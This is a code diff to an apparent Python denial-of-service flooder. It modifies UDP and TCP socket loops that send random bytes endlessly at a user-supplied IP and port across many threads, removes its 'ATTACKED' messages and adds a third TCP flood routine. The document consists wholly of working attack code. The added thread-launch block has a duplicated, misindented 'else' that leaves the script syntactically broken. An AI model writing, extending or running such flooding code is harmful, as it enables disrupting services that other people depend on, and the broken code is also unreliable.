@@ -30,7 +30,7 @@ times = int(input(" Packets :"))
 threads = int(input(" Threads :"))
 os.system("clear")
 def run():
-	data = random._urandom(1800)
+	data = random._urandom(1024)
 	i = random.choice(("[+]","[-]"))
 	while True:
 		try:
@@ -38,12 +38,11 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" RENZY ATTACKED IP%s AND THROUGH THE PORT%s"%(ip,port))
 		except:
-			print("[!] ERROR SERVER TIME OUT")
+			print("[!] ATTACK SENDING TO SERVER")
 
 def run2():
-	data = random._urandom(18)
+	data = random._urandom(16)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
@@ -52,10 +51,22 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" RENZY ATTACKED IP%s AND THROUGH THE PORT%s"%(ip,port))
 		except:
 			s.close()
-			print("[*] ERROR SERVER TIME OUT")
+			print("[*] CONECTION TIME OUT")
+def run3():
+	data = random._urandom(16)
+	i = random.choice(("[$]","[/]","[?]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+		except:
+			s.close()
+			print("[?] CONECTION TIME OUT")
             
 for y in range(threads):
 	if choice == 'y':
@@ -64,3 +75,6 @@ for y in range(threads):
 	else:
 		th = threading.Thread(target = run2)
 		th.start()
+    else:
+        th = threading.Thread(target = run3)
+        th.start()
